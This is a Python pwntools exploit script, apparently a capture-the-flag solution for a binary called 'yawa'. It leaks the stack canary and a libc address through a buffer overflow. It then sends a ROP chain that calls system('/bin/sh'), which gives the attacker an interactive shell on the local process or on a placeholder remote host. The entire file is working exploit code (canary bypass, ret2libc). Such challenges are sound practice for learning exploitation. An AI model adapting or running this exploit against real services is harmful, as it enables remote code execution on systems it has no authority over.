#!/usr/bin/env python3

from pwn import *

exe = ELF("./yawa_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    p = conn()

    # good luck pwning :)
    payload = b"A" * 88
    p.sendlineafter(b"> ", b"1")
    p.sendline(payload)

    p.sendlineafter(b"> ", b"2")
    print(p.recvline())
    canary = u64(b"\x00" + p.recvline()[:-2])
    print(f"canary: {canary}")

    payload = b"A" * 103 #why -1?
    p.sendlineafter(b"> ", b"1")
    p.sendline(payload)
    p.sendlineafter(b"> ", b"2")
    p.recvline()
    libc.address = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x29d90
    #print(f"libc: {libc.addr}")

    pop_rdi = libc.address + 0x2a3e5
    ret = libc.address + 0x0000000000029139
    system_addr = libc.sym["system"]
    binsh = next(libc.search(b"/bin/sh"))

    payload = b"A" * 88
    payload += p64(canary)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    #payload += p64(ret)
    payload += p64(system_addr)
    
    p.sendlineafter(b"> ", b"1")
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()
